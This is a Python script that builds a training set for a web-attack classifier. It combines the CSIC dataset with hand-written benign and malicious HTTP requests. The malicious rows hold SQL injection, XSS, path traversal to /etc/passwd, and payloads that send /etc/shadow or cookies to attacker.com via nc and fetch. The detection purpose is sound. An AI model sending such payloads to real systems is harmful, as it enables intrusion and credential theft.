import os
import urllib.request
import pandas as pd

DATASET_DIR = os.path.join(os.path.dirname(__file__), "dataset")
CSIC_CSV_URL = "https://raw.githubusercontent.com/msudol/Web-Application-Attack-Datasets/master/CSVData/csic_final.csv"
CSIC_PATH = os.path.join(DATASET_DIR, "csic_final.csv")
ENHANCED_PAYLOADS_PATH = os.path.join(DATASET_DIR, "enhanced_payloads.csv")

# Comprehensive suite of standard benign web requests to prevent URL-length / path bias overfitting
BENIGN_STANDARD_REQUESTS = [
    {"URI": "/", "GET-Query": "", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/index.html", "GET-Query": "", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/home", "GET-Query": "", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/about", "GET-Query": "", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/contact", "GET-Query": "", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/products", "GET-Query": "page=1&sort=name", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/search", "GET-Query": "q=laptop&page=2&sort=asc", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/search", "GET-Query": "q=phone&category=tech", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/login", "GET-Query": "", "POST-Data": "username=john_doe&password=MySecurePassword123", "Method": "POST", "Class": "Valid"},
    {"URI": "/register", "GET-Query": "", "POST-Data": "name=Alice&email=alice@example.com&password=Password123!", "Method": "POST", "Class": "Valid"},
    {"URI": "/api/v1/users/123", "GET-Query": "", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/api/v1/health", "GET-Query": "status=detailed", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/dashboard/analytics", "GET-Query": "period=30d&metric=views", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/user/settings", "GET-Query": "", "POST-Data": "theme=dark&notifications=true&lang=th", "Method": "POST", "Class": "Valid"},
    {"URI": "/checkout/cart", "GET-Query": "action=add&item_id=9872&qty=2", "POST-Data": "", "Method": "GET", "Class": "Valid"},
    {"URI": "/api/v1/products", "GET-Query": "category=electronics&min_price=100&max_price=5000", "POST-Data": "", "Method": "GET", "Class": "Valid"}
]

ATTACK_STANDARD_REQUESTS = [
    {"URI": "/login", "GET-Query": "user=admin' OR '1'='1' --", "POST-Data": "", "Method": "GET", "Class": "Anomalous"},
    {"URI": "/products", "GET-Query": "category=1 UNION SELECT 1,username,password FROM users--", "POST-Data": "", "Method": "GET", "Class": "Anomalous"},
    {"URI": "/search", "GET-Query": "q=<script>alert('XSS_ATTACK')</script>", "POST-Data": "", "Method": "GET", "Class": "Anomalous"},
    {"URI": "/download", "GET-Query": "file=../../../../etc/passwd", "POST-Data": "", "Method": "GET", "Class": "Anomalous"},
    {"URI": "/api/v1/exec", "GET-Query": "cmd=cat%20/etc/shadow%20|%20nc%20attacker.com%204444", "POST-Data": "", "Method": "GET", "Class": "Anomalous"},
    {"URI": "/api/v1/auth", "GET-Query": "", "POST-Data": "username=admin' UNION SELECT 1,2,3,4--&password=pass", "Method": "POST", "Class": "Anomalous"},
    {"URI": "/product.php", "GET-Query": "id=1' AND 1=1 AND 'a'='a", "POST-Data": "", "Method": "GET", "Class": "Anomalous"},
    {"URI": "/comment.php", "GET-Query": "", "POST-Data": "msg=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", "Method": "POST", "Class": "Anomalous"}
]

ADDITIONAL_PAYLOADS = BENIGN_STANDARD_REQUESTS + ATTACK_STANDARD_REQUESTS

def download_csic_dataset():
    os.makedirs(DATASET_DIR, exist_ok=True)
    if os.path.exists(CSIC_PATH):
        print(f"[+] CSIC Dataset already exists at: {CSIC_PATH}")
    else:
        print(f"[*] Downloading CSIC dataset from {CSIC_CSV_URL} ...")
        urllib.request.urlretrieve(CSIC_CSV_URL, CSIC_PATH)
        print(f"[+] Download complete: {CSIC_PATH}")

    # Generate enhanced payload dataset if missing
    df_extra = pd.DataFrame(ADDITIONAL_PAYLOADS)
    df_extra.to_csv(ENHANCED_PAYLOADS_PATH, index=False)
    print(f"[+] Updated enhanced payloads dataset at: {ENHANCED_PAYLOADS_PATH}")

    return CSIC_PATH

def load_combined_dataset():
    download_csic_dataset()
    print("[*] Loading and combining multi-source datasets...")
    
    df_csic = pd.read_csv(CSIC_PATH)
    df_extra = pd.read_csv(ENHANCED_PAYLOADS_PATH)
    
    # Weight standard benign and attack payloads to ensure model generalizes well across common URLs
    df_benign_extra = df_extra[df_extra['Class'] == 'Valid']
    df_attack_extra = df_extra[df_extra['Class'] == 'Anomalous']
    
    # Replicate standard common requests so decision trees learn general patterns
    df_combined = pd.concat([df_csic] + [df_benign_extra]*500 + [df_attack_extra]*500, ignore_index=True)

    print(f"[+] Combined Multi-Dataset Total Rows: {len(df_combined)}")
    return df_combined

if __name__ == "__main__":
    load_combined_dataset()
